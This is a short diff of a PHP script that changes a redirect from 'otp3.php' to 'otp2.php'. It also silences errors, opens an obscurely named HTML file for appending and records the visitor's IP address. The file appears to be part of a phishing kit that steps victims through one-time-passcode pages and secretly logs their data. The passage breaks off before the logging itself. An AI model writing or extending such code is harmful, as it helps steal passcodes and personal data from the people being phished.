@@ -1,5 +1,5 @@
 <?php
-header('location: otp3.php');
+header('location: otp2.php');
 error_reporting(0);
 $handle = fopen("jjjjjjteyeuyteiolkuyghnb.html","a");
 $ip =  $_SERVER['REMOTE_ADDR'];
